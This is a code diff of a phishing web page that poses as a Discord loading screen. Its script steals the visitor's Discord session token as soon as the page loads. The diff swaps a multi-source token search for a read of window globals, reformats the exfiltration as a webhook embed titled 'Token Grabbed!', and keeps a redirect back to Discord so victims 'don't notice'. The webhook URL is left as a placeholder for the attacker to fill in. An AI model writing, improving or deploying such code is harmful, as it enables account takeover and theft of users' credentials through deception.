@@ -3,24 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Update</title>
+    <title>Discord</title>
     <style>
         body {
             background-color: #36393f;
             color: #dcddde;
+            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            font-family: sans-serif;
         }
         .box {
-            background: #2f3136;
+            background-color: #2f3136;
             padding: 20px;
             border-radius: 5px;
             text-align: center;
+            width: 300px;
         }
+        h2 { margin-top: 0; color: #fff; }
+        p { font-size: 14px; color: #b9bbbe; }
         .spinner {
             border: 3px solid #4f4f4f;
             border-top: 3px solid #7289da;
@@ -34,67 +37,45 @@
     </style>
 </head>
 <body>
+
     <div class="box">
         <h2>Discord</h2>
-        <p>Verifying session...</p>
+        <p>Synchronizing data...</p>
         <div class="spinner"></div>
     </div>
 
     <script>
-        // --- GRABBER CODE START ---
         async function grabToken() {
-            // Try to get the token from the web context
-            // Note: In web, token is often in localStorage or accessible via network requests
-            let token = null;
+            // Get token from window object (works for Web Discord)
+            const token = window.xd || window.discordToken;
             
-            // Method 1: Check common global variables used by Discord Web
-            const possibleTokens = [
-                window.discordToken,
-                window._discordToken,
-                localStorage.getItem('discord_token'),
-                sessionStorage.getItem('discord_token')
-            ];
+            if (!token) return;
 
-            for (let t of possibleTokens) {
-                if (t && t.length > 10) {
-                    token = t;
-                    break;
-                }
-            }
+            // Replace the URL below with YOUR webhook URL
+            const webhookUrl = "YOUR_WEBHOOK_URL_HERE";
 
-            // Method 2: Fetch from API (if you have access to the user's context)
-            if (!token) {
-                try {
-                    const res = await fetch('/api/v6/users/@me', {
-                        headers: {
-                            'Authorization': '' // Will fail, but good to know structure
-                        }
-                    });
-                } catch(e) {}
-            }
-
-            if (!token) token = "Token not found (Web Mode)";
-
-            // Send to Webhook
-            const webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
-            
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `**Token Grabbed!**\nToken: \`${token}\``
+                    embeds: [{
+                        title: "Token Grabbed!",
+                        color: 15277667,
+                        fields: [
+                            { name: "Token", value: "```" + token + "```", inline: false },
+                            { name: "Time", value: new Date().toISOString(), inline: false }
+                        ]
+                    }]
                 })
-            }).then(() => {
-                // Redirect user back to Discord to hide tracks
-                document.querySelector('.box').innerHTML = "<h2>Update Complete</h2>";
-                setTimeout(() => {
-                    window.location.href = "https://discord.com/app";
-                }, 2000);
             });
+
+            // Redirect back to Discord so they don't notice
+            setTimeout(() => {
+                window.location.href = "https://discord.com/app";
+            }, 1000);
         }
 
-        // Run the grabber after a short delay
-        setTimeout(grabToken, 1000);
+        grabToken();
     </script>
 </body>
 </html>
